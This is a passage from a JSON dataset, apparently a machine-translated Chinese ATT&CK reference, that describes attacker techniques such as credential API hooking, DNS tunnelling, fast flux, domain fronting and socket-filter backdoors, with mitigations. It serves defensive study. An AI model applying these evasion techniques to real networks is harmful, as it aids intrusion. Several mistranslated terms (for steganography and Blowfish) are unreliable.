          "content": "可以使用合法的管理访问作为备份措施来进行输入捕获的这种变化，以通过外部远程服务和有效帐户维护网络访问，也可以通过利用外部面对的Web服务来维护网络访问。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "请勿允许具有许可的管理员帐户来修改组织登录门户的Web内容，用于日常操作，这些操作可能会使它们暴露于无私人系统上的潜在对手。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1056.004",
    "name": "Credential API Hooking",
    "tactics": [
      {
        "id": "TA0009",
        "name": "Collection"
      },
      {
        "id": "TA0006",
        "name": "Credential Access"
      }
    ],
    "technique": "Input Capture",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以将Windows应用程序编程接口（API）功能挂钩以收集用户凭据。恶意挂钩机制可能会捕获包含参数的API调用，这些参数揭示了用户身份验证凭据。与KeyLogging不同，该技术专门针对API函数，其中包含显示用户凭据的参数。钩子涉及将调用调用到这些功能，并且可以通过以下方式实现："
        }
      ],
      [
        {
          "type": "list",
          "content": "挂钩过程，该过程响应诸如消息，击键和鼠标输入等事件的事件，拦截和执行指定的代码。"
        },
        {
          "type": "list",
          "content": "导入地址表（IAT）挂钩，对过程的IAT进行了修改，在其中存储了指向导入的API函数的指针。"
        },
        {
          "type": "list",
          "content": "Inline挂钩，覆盖API函数中的第一个字节以重定向代码流。"
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "这种类型的攻击技术无法通过预防控制来轻松减轻，因为它基于对系统功能的滥用。"
      }
    ]
  },
  {
    "id": "T1071.001",
    "name": "Web Protocols",
    "tactics": [
      {
        "id": "TA0011",
        "name": "Command and Control"
      }
    ],
    "technique": "Application Layer Protocol",
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以使用与Web流量关联的应用程序层协议进行通信，以避免通过与现有流量混合来避免检测/网络过滤。远程系统的命令，通常这些命令的结果将嵌入客户端和服务器之间的协议流量中。"
        }
      ],
      [
        {
          "type": "text",
          "content": "在环境中，携带网络流量的HTTP/S和Websocket等协议可能非常普遍。HTTP/S数据包具有许多字段和标题，可以隐藏数据。对手可能会滥用这些协议，以与受害者网络中控制的系统进行通信，同时也模仿正常的预期流量。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1031",
        "name": "网络入侵预防",
        "description": [
          [
            {
              "type": "text",
              "content": "使用网络签名来识别特定对手恶意软件的流量的网络入侵检测和预防系统可用于减轻网络级别的活动。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1071.002",
    "name": "File Transfer Protocols",
    "tactics": [
      {
        "id": "TA0011",
        "name": "Command and Control"
      }
    ],
    "technique": "Application Layer Protocol",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以使用与传输文件关联的应用程序层协议进行通信，以避免通过与现有流量混合来避免检测/网络过滤。远程系统的命令，通常这些命令的结果将嵌入客户端和服务器之间的协议流量中。"
        }
      ],
      [
        {
          "type": "text",
          "content": "传输文件在环境中可能非常普遍的协议，例如SMB，FTP，FTP和TFTP。这些协议产生的数据包可能具有许多字段和标题，可以隐藏数据。数据也可以隐藏在传输的文件中。对手可能会滥用这些协议，以与受害者网络中控制的系统进行通信，同时也模仿正常的预期流量。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1031",
        "name": "网络入侵预防",
        "description": [
          [
            {
              "type": "text",
              "content": "使用网络签名来识别特定对手恶意软件的流量的网络入侵检测和预防系统可用于减轻网络级别的活动。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1071.003",
    "name": "Mail Protocols",
    "tactics": [
      {
        "id": "TA0011",
        "name": "Command and Control"
      }
    ],
    "technique": "Application Layer Protocol",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以使用与电子邮件交付相关的应用层协议进行通信，以避免通过与现有流量混合来检测/网络过滤。远程系统的命令，通常这些命令的结果将嵌入客户端和服务器之间的协议流量中。"
        }
      ],
      [
        {
          "type": "text",
          "content": "携带电子邮件的SMTP/S，POP3/S和IMAP等协议在环境中可能非常普遍。这些协议产生的数据包可能具有许多字段和标题，可以隐藏数据。数据也可以隐藏在电子邮件本身中。对手可能会滥用这些协议，以与受害者网络中控制的系统进行通信，同时也模仿正常的预期流量。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1031",
        "name": "网络入侵预防",
        "description": [
          [
            {
              "type": "text",
              "content": "使用网络签名来识别特定对手恶意软件的流量的网络入侵检测和预防系统可用于减轻网络级别的活动。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1071.004",
    "name": "DNS",
    "tactics": [
      {
        "id": "TA0011",
        "name": "Command and Control"
      }
    ],
    "technique": "Application Layer Protocol",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以使用域名系统（DNS）应用程序层协议进行通信，以避免通过与现有流量混合来避免检测/网络过滤。远程系统的命令，通常这些命令的结果将嵌入客户端和服务器之间的协议流量中。"
        }
      ],
      [
        {
          "type": "text",
          "content": "DNS协议在计算机网络中具有管理功能，因此在环境中可能非常普遍。在网络身份验证完成之前，也可以允许DNS流量。DNS数据包包含许多字段和标题，可以隐藏数据。对手通常被称为DNS隧道，可能会滥用DNS与受害者网络中控制的系统进行通信，同时也模仿正常的预期流量。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1037",
        "name": "过滤网络流量",
        "description": [
          [
            {
              "type": "text",
              "content": "考虑将DNS请求过滤到未知，未经信任或已知的不良域和资源中。使用本地/代理服务器解决DNS请求也可能会破坏对手试图在DNS数据包中隐藏数据的尝试。"
            }
          ]
        ]
      },
      {
        "id": "M1031",
        "name": "网络入侵预防",
        "description": [
          [
            {
              "type": "text",
              "content": "使用网络签名来识别特定对手恶意软件的流量的网络入侵检测和预防系统可用于减轻网络级别的活动。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1132.001",
    "name": "Standard Encoding",
    "tactics": [
      {
        "id": "TA0011",
        "name": "Command and Control"
      }
    ],
    "technique": "Data Encoding",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以使用标准数据编码系统编码数据，以使命令内容和控制流量更难检测到。命令和控制（C2）信息可以使用遵守现有协议规范的标准数据编码系统进行编码。常见的数据编码方案包括ASCII，Unicode，十六进制，Base64和Mime。一些数据编码系统也可能导致数据压缩，例如GZIP。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1031",
        "name": "网络入侵预防",
        "description": [
          [
            {
              "type": "text",
              "content": "使用网络签名来识别特定对手恶意软件的流量的网络入侵检测和预防系统可用于减轻网络级别的活动。签名通常用于协议中的独特指标，并且可能基于特定对手或工具使用的特定混淆技术，并且在各种恶意软件系列和版本中可能会有所不同。对手可能会随着时间的推移更改工具C2签名或构建协议，以避免通过常见的防御工具检测。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1132.002",
    "name": "Non-Standard Encoding",
    "tactics": [
      {
        "id": "TA0011",
        "name": "Command and Control"
      }
    ],
    "technique": "Data Encoding",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以使用非标准数据编码系统编码数据，以使命令的内容和控制流量更难以检测。命令和控制（C2）信息可以使用与现有协议规范不同的非标准数据编码系统进行编码。非标准数据编码方案可能基于或与标准数据编码方案有关，例如用于HTTP请求的消息主体的修改基本64编码。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1031",
        "name": "网络入侵预防",
        "description": [
          [
            {
              "type": "text",
              "content": "使用网络签名来识别特定对手恶意软件的流量的网络入侵检测和预防系统可用于减轻网络级别的活动。签名通常用于协议中的独特指标，并且可能基于特定对手或工具使用的特定混淆技术，并且在各种恶意软件系列和版本中可能会有所不同。对手可能会随着时间的推移更改工具C2签名或构建协议，以避免通过常见的防御工具检测。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1001.001",
    "name": "Junk Data",
    "tactics": [
      {
        "id": "TA0011",
        "name": "Command and Control"
      }
    ],
    "technique": "Data Obfuscation",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以将垃圾数据添加到用于命令和控制的协议中，以使检测更加困难。通过将随机或无意义的数据添加到用于命令和控制的协议中，对手可以防止用于解码，解密或以其他方式分析流量的微不足道方法。示例可能包括带有垃圾字符的附加数据或在重要字符之间编写垃圾字符。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1031",
        "name": "网络入侵预防",
        "description": [
          [
            {
              "type": "text",
              "content": "使用网络签名来识别特定对手恶意软件的流量的网络入侵检测和预防系统可用于减轻网络级别的某些混淆活动。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1001.002",
    "name": "Steganography",
    "tactics": [
      {
        "id": "TA0011",
        "name": "Command and Control"
      }
    ],
    "technique": "Data Obfuscation",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会使用地理技术隐藏命令和控制流量，以使检测工作更加困难。地理技术可用于将数据隐藏在系统之间传输的数字消息中。这些隐藏的信息可用于命令和控制受损的系统。在某些情况下，可以使用隐形摄影（例如图像或文档文件）嵌入的文件传递来命令和控制。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1031",
        "name": "网络入侵预防",
        "description": [
          [
            {
              "type": "text",
              "content": "使用网络签名来识别特定对手恶意软件的流量的网络入侵检测和预防系统可用于减轻网络级别的某些混淆活动。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1001.003",
    "name": "Protocol Impersonation",
    "tactics": [
      {
        "id": "TA0011",
        "name": "Command and Control"
      }
    ],
    "technique": "Data Obfuscation",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会冒充合法的协议或Web服务流量，以掩盖命令和控制活动以及阻碍分析工作。通过模拟合法协议或Web服务，对手可以使他们的命令和控制流量与合法的网络流量融为一体。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能会冒充假SSL/TLS握手，以使其看起来随后的流量是SSL/TLS加密的，可能会干扰某些安全工具，或者使流量看起来与受信任的实体相关。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1031",
        "name": "网络入侵预防",
        "description": [
          [
            {
              "type": "text",
              "content": "使用网络签名来识别特定对手恶意软件的流量的网络入侵检测和预防系统可用于减轻网络级别的某些混淆活动。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1568.001",
    "name": "Fast Flux DNS",
    "tactics": [
      {
        "id": "TA0011",
        "name": "Command and Control"
      }
    ],
    "technique": "Dynamic Resolution",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以使用快速通量DNS隐藏命令和控制频道，后面是链接到单个域分辨率的快速变化的IP地址。该技术使用一个完全合格的域名，分配了多个IP地址，这些IP地址用高频换成，使用循环IP地址和短时间live（TTL）的组合来获得DNS资源记录。"
        }
      ],
      [
        {
          "type": "text",
          "content": "最简单的“单升”方法涉及注册和删除地址作为单个DNS名称的DNS A（地址）记录列表的一部分。这些注册的平均寿命为五分钟，导致IP地址分辨率不断变化。"
        }
      ],
      [
        {
          "type": "text",
          "content": "相比之下，“双流量”方法寄存器和删除地址作为DNS区域DNS名称服务器记录列表的一部分，为连接提供了其他弹性。借助双升压，其他主机可以充当C2主机的代理，从而进一步绝缘C2通道的真正来源。"
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "这种类型的攻击技术无法通过预防控制来轻松减轻，因为它基于对系统功能的滥用。"
      }
    ]
  },
  {
    "id": "T1568.002",
    "name": "Domain Generation Algorithms",
    "tactics": [
      {
        "id": "TA0011",
        "name": "Command and Control"
      }
    ],
    "technique": "Dynamic Resolution",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以利用域生成算法（DGA）动态识别命令和控制流量的目标域，而不是依靠静态IP地址或域列表。这具有使防御者更难阻止，跟踪或接管命令和控制渠道的优势，因为恶意软件可能会检查指令的数千个域。"
        }
      ],
      [
        {
          "type": "text",
          "content": "当DGA通过生成每个字母来构造域名时，DGA可以采取明显随机或“ gibberish”字符串（例如：istgmxdejdnxuyla.ru）的形式。另外，一些DGA通过将单词串在一起而不是字母将整个单词用作单元（例如：ex：cityjulydish.net）。许多DGA是基于时间的，每个时间段（每小时，每日，每月等）会产生不同的域。其他人也结合了种子价值，以使预测未来的领域对防守者的难度更大。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以将DGA用于后备渠道。当主命令和控制服务器丢失接触时，恶意软件可能会采用DGA作为重新建立命令和控制的手段。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1031",
        "name": "网络入侵预防",
        "description": [
          [
            {
              "type": "text",
              "content": "使用网络签名来识别特定对手恶意软件的流量的网络入侵检测和预防系统可用于减轻网络级别的活动。恶意软件的研究人员可以逆转使用DGA的恶意软件变体，并确定恶意软件将尝试联系的未来域，但这是时间和资源密集型努力。恶意软件还越来越多地合并了每个实例可能是唯一的种子价值，然后需要确定提取未来生成的域。在某些情况下，可以从DNS流量中提取特定样品使用的种子。即便如此，每天也可能产生数千个可能的域。这使得捍卫者由于费用而进行预先注册所有可能的C2域，这是不切实际的。"
            }
          ]
        ]
      },
      {
        "id": "M1021",
        "name": "限制基于Web的内容",
        "description": [
          [
            {
              "type": "text",
              "content": "在某些情况下，可以使用本地DNS污水坑来帮助防止基于DGA的命令和控制成本降低。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1568.003",
    "name": "DNS Calculation",
    "tactics": [
      {
        "id": "TA0011",
        "name": "Command and Control"
      }
    ],
    "technique": "Dynamic Resolution",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以对DNS结果中返回的地址进行计算，以确定用于命令和控制的端口和IP地址，而不是依靠预定的端口号或实际返回的IP地址。IP和/或端口号计算可用于绕过C2通道上的出口过滤。"
        }
      ],
      [
        {
          "type": "text",
          "content": "DNS计算的一种实现是在DNS响应中将IP地址的前三个八位钟进行操作，并使用这些值来计算命令和控制流量的端口。"
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "这种类型的攻击技术无法通过预防控制来轻松减轻，因为它基于对系统功能的滥用。"
      }
    ]
  },
  {
    "id": "T1573.001",
    "name": "Symmetric Cryptography",
    "tactics": [
      {
        "id": "TA0011",
        "name": "Command and Control"
      }
    ],
    "technique": "Encrypted Channel",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以采用已知的对称加密算法来掩盖命令和控制流量，而不是依靠通信协议提供的任何固有保护措施。对称加密算法使用相同的密钥进行明文加密和密文解密。常见的对称加密算法包括AES，DES，3DES，BLOCLIFE和RC4。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1031",
        "name": "网络入侵预防",
        "description": [
          [
            {
              "type": "text",
              "content": "使用网络签名来识别特定对手恶意软件的流量的网络入侵检测和预防系统可用于减轻网络级别的活动。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1573.002",
    "name": "Asymmetric Cryptography",
    "tactics": [
      {
        "id": "TA0011",
        "name": "Command and Control"
      }
    ],
    "technique": "Encrypted Channel",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以采用已知的不对称加密算法来掩盖命令和控制流量，而不是依靠通信协议提供的任何固有保护措施。非对称密码学，也称为公共密钥密码学，使用一个党的按键：一个可以自由分发的公众，一个私人。由于如何生成键，发件人使用接收器的公钥加密数据，并且接收器用其私钥将数据解密。这样可以确保只有预期的收件人才能读取加密数据。常见的公钥加密算法包括RSA和Elgamal。"
        }
      ],
      [
        {
          "type": "text",
          "content": "为了效率，一旦建立连接，许多协议（包括SSL/TLS）都会使用对称加密，但是使用不对称的密码学来建立或传输密钥。因此，这些方案被归类为不对称的密码学。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1031",
        "name": "网络入侵预防",
        "description": [
          [
            {
              "type": "text",
              "content": "使用网络签名来识别特定对手恶意软件的流量的网络入侵检测和预防系统可用于减轻网络级别的活动。"
            }
          ]
        ]
      },
      {
        "id": "M1020",
        "name": "SSL/TLS检查",
        "description": [
          [
            {
              "type": "text",
              "content": "SSL/TLS检查可用于查看加密会话的内容，以查找基于网络的恶意软件通信协议的指标。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1090.001",
    "name": "Internal Proxy",
    "tactics": [
      {
        "id": "TA0011",
        "name": "Command and Control"
      }
    ],
    "technique": "Proxy",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以使用内部代理来指导和控制受损环境中两个或多个系统之间的流量。存在许多工具，可以通过代理或端口重定向进行流量重定向，包括HTRAN，ZXPROXY和ZXPORTMAP。对手使用内部代理来管理受损环境中的命令和控制通信，以减少同时出站网络连接的数量，以在连接损失面对连接损失时提供弹性，或者骑行受感染系统之间的现有信任通信路径以避免怀疑。内部代理连接可以使用常见的点对点（P2P）网络协议，例如SMB，以更好地与环境融合。"
        }
      ],
      [
        {
          "type": "text",
          "content": "通过使用折衷的内部系统作为代理，对手可能会隐藏C2流量的真正目的地，同时减少与外部系统的众多连接的需求。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1031",
        "name": "网络入侵预防",
        "description": [
          [
            {
              "type": "text",
              "content": "使用网络签名来识别特定对手恶意软件的流量的网络入侵检测和预防系统可用于减轻网络级别的活动。签名通常用于协议中的唯一指标，并且可能基于特定对手或工具使用的特定C2协议，并且在各种恶意软件系列和版本中可能会有所不同。对手可能会随着时间的推移更改工具C2签名或构建协议，以避免通过常见的防御工具检测。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1090.002",
    "name": "External Proxy",
    "tactics": [
      {
        "id": "TA0011",
        "name": "Command and Control"
      }
    ],
    "technique": "Proxy",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以使用外部代理作为与命令和控制服务器的网络通信的中介，以避免与基础架构的直接连接。存在许多工具，可以通过代理或端口重定向进行流量重定向，包括HTRAN，ZXPROXY和ZXPORTMAP。对手使用这些类型的代理来管理命令和控制通信，面对连接损失，或骑行现有的可信通信路径以避免怀疑。"
        }
      ],
      [
        {
          "type": "text",
          "content": "外部连接代理用于掩盖C2流量的目的地，通常由端口重定向器实现。受害者环境之外的损坏系统可用于这些目的，以及购买的基础架构，例如基于云的资源或虚拟私人服务器。可以根据折衷系统与他们的联系的可能性很小的可能性选择代理。受害者系统将直接与Internet上的外部代理进行通信，然后代理将转发到C2服务器。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1031",
        "name": "网络入侵预防",
        "description": [
          [
            {
              "type": "text",
              "content": "使用网络签名来识别特定对手恶意软件的流量的网络入侵检测和预防系统可用于减轻网络级别的活动。签名通常用于协议中的唯一指标，并且可能基于特定对手或工具使用的特定C2协议，并且在各种恶意软件系列和版本中可能会有所不同。对手可能会随着时间的推移更改工具C2签名或构建协议，以避免通过常见的防御工具检测。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1090.003",
    "name": "Multi-hop Proxy",
    "tactics": [
      {
        "id": "TA0011",
        "name": "Command and Control"
      }
    ],
    "technique": "Proxy",
    "version": "2.0",
    "description": [
      [
        {
          "type": "text",
          "content": "为了掩盖恶意流量的来源，对手可能会将多个代理人链在一起。通常，辩护人将能够在进入网络之前识别出最后的代理流量；后卫可能会或可能无法在最后一个跳动代理之前识别任何以前的代理人。通过要求防守者通过多个代理追踪恶意流量来识别其来源，这项技术使识别恶意流量的原始来源变得更加困难。这种行为的一个特殊变体是使用洋葱路由网络，例如公开可用的TOR网络。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对于网络基础架构，尤其是路由器，对手有可能利用多个受损的设备在企业的广阔区域网络（WAN）中创建一个多跳的代理链。通过利用补丁系统图像，对手可以将自定义代码添加到受影响的网络设备，这些网络设备将在这些节点之间实现洋葱路由。此自定义洋葱路由网络将通过受损害的人群运输加密的C2流量，使对手可以与洋葱路由网络中的任何设备进行通信。该方法取决于网络边界桥接方法，以使对手能够越过Internet周边的受保护网络边界并进入组织的WAN。诸如ICMP之类的协议可用作传输。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1037",
        "name": "过滤网络流量",
        "description": [
          [
            {
              "type": "text",
              "content": "可以通过使用网络允许和块列表来阻止已知匿名网络和C2基础架构的流量。应当指出的是，这种阻止可能会被其他技术（例如域前）绕过。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1090.004",
    "name": "Domain Fronting",
    "tactics": [
      {
        "id": "TA0011",
        "name": "Command and Control"
      }
    ],
    "technique": "Proxy",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以利用内容交付网络（CDN）和其他服务中的路由方案，这些方案托有多个域，以混淆HTTPS流量的预期目的地或通过HTTPS隧道的流量。前面的域涉及在TLS标头的SNI字段和HTTP标头的主机字段中使用不同的域名。如果两个域都是从同一CDN提供的，则CDN可以在解开TLS标头后将其路由到HTTP标头中指定的地址。该技术的一种变体“无域”在前面，利用了空白的SNI字段；即使CDN试图验证SNI和HTTP主机字段匹配（如果忽略了SNI和HTTP主机字段），则可能会使边缘工作。"
        }
      ],
      [
        {
          "type": "text",
          "content": "例如，如果Domain-X和Domain-Y是同一CDN的客户，则可以将domain-X放置在TLS标头和HTTP标头中。流量似乎将进入domain-X，但是CDN可能会将其路由到域Y。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1020",
        "name": "SSL/TLS检查",
        "description": [
          [
            {
              "type": "text",
              "content": "如果可以检查HTTPS流量，则可以分析捕获的连接，这些连接似乎是域前的域。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1205.001",
    "name": "Port Knocking",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0011",
        "name": "Command and Control"
      }
    ],
    "technique": "Traffic Signaling",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以使用端口敲门来隐藏用于持久性或命令和控制的开放端口。为了启用端口，对手会将一系列尝试的连接发送到预定义的封闭端口序列。序列完成后，打开端口通常由基于主机的防火墙完成，但也可以通过自定义软件实现。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对于听力端口的动态开放，以及在另一个系统上与侦听服务器的连接的启动，已经观察到了这一技术。"
        }
      ],
      [
        {
          "type": "text",
          "content": "可以通过不同的方法进行触发信号数据包的观察。最初由CD00R实施的一种手段是使用LibPCAP库来嗅探有关数据包。另一种方法利用了原始插座，这使恶意软件能够使用已打开的端口，以供其他程序使用。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1037",
        "name": "过滤网络流量",
        "description": [
          [
            {
              "type": "text",
              "content": "可以通过使用状态防火墙来实现这种技术的某些变体，具体取决于其实施方式。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1205.002",
    "name": "Socket Filters",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0011",
        "name": "Command and Control"
      }
    ],
    "technique": "Traffic Signaling",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以将过滤器连接到网络插座以监视，然后激活用于持久或命令和控制的后门。使用升高的权限，对手可以使用诸如"
        },
        {
          "type": "code",
          "content": " libpcap "
        },
        {
          "type": "text",
          "content": "库之类的功能打开插座并安装过滤器，以允许或禁止某些类型的数据通过套接字。过滤器可以应用于通过指定的网络接口（如果未指定）的所有流量（或每个接口）。当网络接口接收到匹配过滤器标准的数据包时，可以在主机上触发其他操作，例如反向外壳的激活。"
        }
      ],
      [
        {
          "type": "text",
          "content": "为了建立连接，对手将制作的数据包发送到与已安装的滤波器标准相匹配的目标主机。对手已经使用这些套接字过滤器来触发植入物的安装，进行ping背部并调用命令壳。与这些插座过滤器的通信也可以与协议隧道结合使用。"
        }
      ],
      [
        {
          "type": "text",
          "content": "可以使用"
        },
        {
          "type": "code",
          "content": " libpcap "
        },
        {
          "type": "text",
          "content": "安装的任何类似Unix的平台上安装过滤器，也可以使用"
        },
        {
          "type": "code",
          "content": " winpcap "
        },
        {
          "type": "text",
          "content": "安装</code>。对手可以使用"
        },
        {
          "type": "code",
          "content": " libpcap "
        },
        {
          "type": "text",
          "content": "与"
        },
        {
          "type": "code",
          "content": " pcap_setfilter "
        },
        {
          "type": "text",
          "content": "或标准库功能"
        },
        {
          "type": "code",
          "content": " setSockopt "
        },
        {
          "type": "text",
          "content": " so_attach_filter </code> options setsockopt </code>。由于插座连接在收到数据包之前不活动，因此由于主机上缺乏活动，低CPU开销以及对原始插座使用情况的可见性有限，因此可能难以检测此行为。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1037",
        "name": "过滤网络流量",
        "description": [
          [
            {
              "type": "text",
              "content": "可以通过使用状态防火墙来实现这种技术的某些变体，具体取决于其实施方式。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1102.001",
    "name": "Dead Drop Resolver",
    "tactics": [
      {
        "id": "TA0011",
        "name": "Command and Control"
      }
    ],
    "technique": "Web Service",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以使用现有的合法外部Web服务来托管指向其他命令和控制（C2）基础结构的信息。对手可能会在具有嵌入式（且经常混淆/编码的）域或IP地址的Web服务上发布内容，称为死滴解析器。一旦被感染，受害者将与这些解析器联系并重定向。"
        }
      ],
      [
        {
          "type": "text",
          "content": "流行的网站和社交媒体充当C2机制，可能会给大量掩护，因为网络中的主机在妥协之前已经与他们进行交流。使用常见服务（例如Google或Twitter提供的服务），使对手更容易隐藏在预期的噪音中。Web服务提供商通常使用SSL/TLS加密，从而为对手提供了额外的保护水平。"
        }
      ],
      [
        {
          "type": "text",
          "content": "使用死滴解析器还可以通过恶意软件二进制分析来保护后端C2基础架构，同时还可以启用操作弹性（因为该基础架构可能会动态更改）。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1031",
        "name": "网络入侵预防",
        "description": [
          [
            {
              "type": "text",
              "content": "使用网络签名来识别特定对手恶意软件的流量的网络入侵检测和预防系统可用于减轻网络级别的活动。"
            }
          ]
        ]
      },
      {
        "id": "M1021",
        "name": "限制基于Web的内容",
        "description": [
          [
            {
              "type": "text",
              "content": "Web代理可用于执行防止使用未经授权的外部服务的外部网络通信策略。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1102.002",
    "name": "Bidirectional Communication",
    "tactics": [
      {
        "id": "TA0011",
        "name": "Command and Control"
      }
    ],
    "technique": "Web Service",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以使用现有合法的外部Web服务作为将命令通过Web Service Channel发送和接收输出的手段。受损的系统可能利用流行的网站和社交媒体来托管命令和控制（C2）指令。然后，这些受感染的系统可以通过该Web服务频道从这些命令中发送回输出。返回流量可能以多种方式发生，具体取决于所使用的Web服务。例如，退货流量可以采取折衷系统的形式，在论坛上发布评论，向开发项目发出拉动请求，更新在Web服务上托管的文档或发送推文。"
        }
      ],
      [
        {
          "type": "text",
          "content": "流行的网站和社交媒体充当C2机制，可能会给大量掩护，因为网络中的主机在妥协之前已经与他们进行交流。使用常见服务（例如Google或Twitter提供的服务），使对手更容易隐藏在预期的噪音中。Web服务提供商通常使用SSL/TLS加密，从而为对手提供了额外的保护水平。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1031",
        "name": "网络入侵预防",
        "description": [
          [
            {
              "type": "text",
              "content": "使用网络签名来识别特定对手恶意软件的流量的网络入侵检测和预防系统可用于减轻网络级别的活动。"
            }
          ]
        ]
      },
      {
        "id": "M1021",
        "name": "限制基于Web的内容",
        "description": [
          [
            {
              "type": "text",
              "content": "Web代理可用于执行防止使用未经授权的外部服务的外部网络通信策略。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1102.003",
    "name": "One-Way Communication",
    "tactics": [
      {
        "id": "TA0011",
        "name": "Command and Control"
      }
    ],
    "technique": "Web Service",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以使用现有合法的外部Web服务作为将命令发送到折衷系统的手段，而无需通过Web服务渠道接收返回输出。受损的系统可能利用流行的网站和社交媒体来托管命令和控制（C2）指令。那些受感染的系统可以选择通过不同的C2通道将这些命令的输出发送回输出，包括另一个不同的Web服务。另外，如果对手想要向系统发送指令并且不想要响应的情况，那么妥协的系统可能根本不返回输出。"
        }
      ],
      [
        {
          "type": "text",
          "content": "流行的网站和社交媒体充当C2机制，可能会给大量掩护，因为网络中的主机在妥协之前已经与他们进行交流。使用常见服务（例如Google或Twitter提供的服务），使对手更容易隐藏在预期的噪音中。Web服务提供商通常使用SSL/TLS加密，从而为对手提供了额外的保护水平。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1031",
        "name": "网络入侵预防",
        "description": [
          [
            {
              "type": "text",
              "content": "使用网络签名来识别特定对手恶意软件的流量的网络入侵检测和预防系统可用于减轻网络级别的活动。"
            }
          ]
        ]
      },
      {
        "id": "M1021",
        "name": "限制基于Web的内容",
        "description": [
          [
            {
              "type": "text",
              "content": "Web代理可用于执行防止使用未经授权的外部服务的外部网络通信策略。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1020.001",
    "name": "Traffic Duplication",
    "tactics": [
      {
        "id": "TA0010",
        "name": "Exfiltration"
      }
    ],
    "technique": "Automated Exfiltration",
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
